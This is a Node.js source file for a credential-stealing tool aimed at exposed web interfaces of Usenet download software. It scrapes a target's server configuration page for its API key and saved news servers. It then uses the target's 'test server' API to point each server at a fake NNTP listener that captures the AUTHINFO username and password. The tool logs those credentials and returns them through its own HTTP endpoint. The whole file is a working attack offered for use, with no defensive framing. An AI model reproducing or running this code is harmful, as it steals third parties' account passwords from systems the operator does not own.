import { JSDOM } from "jsdom";
import { readFileSync } from "fs";
import config from "./config.json" assert { type: "json" };
import undici from "undici";
import net from "net";
import fastify from "fastify";
import chalk from "chalk";

const httpServer = fastify({
	// logger: true
});
const nntpServer = net.createServer();
const testServerBodyBase = {
	mode: "config",
	name: "test_server",
	apikey: "",
	output: "json",
	server: "",
	ajax: "1",
	enable: "1",
	displayname: "",
	host: "",
	port: "",
	username: "",
	password: "**********",
	connections: "1",
	priority: "0",
	retention: "0",
	timeout: "20",
	ssl_verify: "0",
	ssl_ciphers: "",
	expire_date: "",
	quota: "",
	notes: "",
};
const testServerHeaders = {
	Accept: "*/*",
	"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
	Referer: "",
};
let credentials = {};

// #region HTTP
const bRequest = async (url, opts = {}) => {
	let body;
	let err;
	try {
		body = (
			await undici.request(url, {
				...opts,
				bodyTimeout: 30000,
			})
		).body;
	} catch (e) {
		err = e.message;
	}
	return [err, body];
};

httpServer.get("/", async (_, reply) => {
	const file = readFileSync("./index.html");
	reply.type("text/html").send(file);
});

httpServer.get("/robots.txt", async (_, reply) => {
	reply.send(`User-agent: *
Disallow: /`);
});

httpServer.get("/:target", async (request) => {
	const { target } = request.params;
	credentials[target.split(":")[0]] = [];
	const baseUrl = `http://${target}`;
	if (!target.match(/[0-9]+(?:\.[0-9]+){3}:[0-9]+/)?.length) {
		return {
			error: true,
			data: {
				message: "Invalid IP Address",
			},
		};
	}

	console.log(chalk.green(`+ [http] (${target.split(":")[0]}) new target`));
	const [error, body] = await bRequest(`${baseUrl}/config/server/`);
	if (error) {
		return {
			error: true,
			data: {
				message: error,
			},
		};
	}
	const rawBody = await body.text();
	const { document } = new JSDOM(rawBody).window;

	const apiKey = document.scripts[0].textContent
		.split("apikey=")[1]
		.split("'")[0];
	const servers = [...document.querySelectorAll(".fullform")].map((form) => ({
		server: form.querySelector("[name=server]").value,
		host: form.querySelector("[name=host]").value,
		description: form.querySelector("[name=displayname]").value,
		username: form.querySelector("[data-hide=username]").value,
		password: "",
		port: form.querySelector("[name=port]").value,
		ssl: Boolean(form.querySelector("[name=ssl]").value),
	}));
	for (let server of servers) {
		const testServer = async (host, port, alt = false) => {
			let [error, body] = await bRequest(`http://${target}/api`, {
				method: "POST",
				headers: {
					...testServerHeaders,
					Referer: `http://${target}/config/server/`,
				},
				body: new URLSearchParams({
					...testServerBodyBase,
					apikey: apiKey,
					...(alt ? { server: server.server } : { server: server.description }),
					...(alt ? { [server.server]: 1 } : { [server.description]: 1 }),
					displayname: server.description,
					host: host,
					port: String(port),
					...(server.ssl ? { ssl: "1" } : {}),
					username: server.username,
				}).toString(),
			});
			if (error) {
				return [false, error];
			}

			let response = {};
			try {
				response = await body.json();
			} catch (e) {
				return [false, "JSON parsing error"];
			}

			return [response.value.result, response.value.message];
		};

		const originalPort = server.port;
		const portsToTry = [originalPort, 563, 119];
		let skipServer = true;
		for (const port of portsToTry) {
			let [result, message] = await testServer(server.host, port);
			if (message.trim() === "Password masked in ******, please re-enter") {
				[result, message] = await testServer(server.host, port, true);
			}

			if (
				[
					"Authentication failed, check username/password.",
					"502 Authentication Failed",
				].includes(message)
			) {
				console.log(
					chalk.red.bold(
						`  │ [http] username and password is invalid, skipping. (${server.host.toLowerCase()})`,
					),
				);
				break;
			}

			if (!result) {
				console.log(
					chalk.red.bold(
						`  │ [http] failed. (${server.host.toLowerCase()}:${port} | ${message.trim()})`,
					),
				);
				continue;
			}

			skipServer = false;
			console.log(
				chalk.green.bold(
					`  │ [http] connection successful (${server.host.toLowerCase()})`,
				),
			);
			break;
		}

		if (skipServer) continue;

		const originalSsl = server.ssl;
		server.ssl = false;
		credentials[target.split(":")[0]].push({
			...server,
		});
		let [_, message] = await testServer(
			config.nntp.host,
			config.nntp.port,
			false,
		);
		if (message.trim() === "Password masked in ******, please re-enter") {
			[_, message] = await testServer(server.host, port, true);
		}
		server.ssl = originalSsl;

		credentials[target.split(":")[0]][""] = {
			// god knows why this works
			...credentials[target.split(":")[0]],
		};
	}

	return {
		error: false,
		data: credentials[target.split(":")[0]].filter(cred => cred.password),
	};
});
// #endregion

// #region NNTP
nntpServer.on("connection", (socket) => {
	console.log(
		chalk.blue(
			`  │    [nntp] (${socket.remoteAddress}) new connection established`,
		),
	);
	const timeout = setTimeout(() => {
		chalk.red.bold("  │     timeout.");
		socket.destroy();
	}, 10000);
	let credentialKey = "";

	socket.on("data", (data) => {
		const stringifiedData = data.toString();
		if (!stringifiedData.trim().startsWith("authinfo")) {
			console.error(chalk.red.bold("  │     disable SSL and try again."));
			socket.destroy();
			console.log(stringifiedData);
		}
		const key = stringifiedData.trim().split(" ")[1];
		const value = stringifiedData.trim().split(" ")[2];

		if (key === "user") {
			// this is to find IP if mismatched
			Object.keys(credentials).forEach((addr) => {
				if (
					credentials[addr].find((server) => server.username === value.trim())
				)
					credentialKey = addr;
			});
			credentials[credentialKey][
				credentials[credentialKey].length - 1
			].username = value.trim();
		}

		if (key === "pass") {
			credentials[credentialKey][
				credentials[credentialKey].length - 1
			].password = value.trim();
			clearTimeout(timeout);
			socket.destroy();
			console.log(chalk.blue.bold("  │      [nntp] grabbed credentials:"));
			console.log(
				chalk.blue(
					`  │        [nntp] username: ${
						credentials[credentialKey][credentials[credentialKey].length - 1]
							.username
					}`,
				),
			);
			console.log(
				chalk.blue(
					`  │        [nntp] password: ${
						credentials[credentialKey][credentials[credentialKey].length - 1]
							.password
					}`,
				),
			);
		}
	});

	socket.write("\x00"); // handshake (get username)
	setTimeout(() => {
		socket.write("381"); // ask for password
	}, 500);
});
// #endregion

const start = async () => {
	try {
		await httpServer.listen(
			{
				host: config.http.host,
				port: config.http.port,
			},
			() => {
				console.log(
					`HTTP server listening on ${config.http.host}:${config.http.port}`,
				);
			},
		);
		nntpServer.listen(config.nntp.port, config.nntp.host, () => {
			console.log(
				`NNTP server listening on ${config.nntp.host}:${config.nntp.port}`,
			);
		});
	} catch (err) {
		httpServer.log.error(err);
		process.exit(1);
	}
};

start();
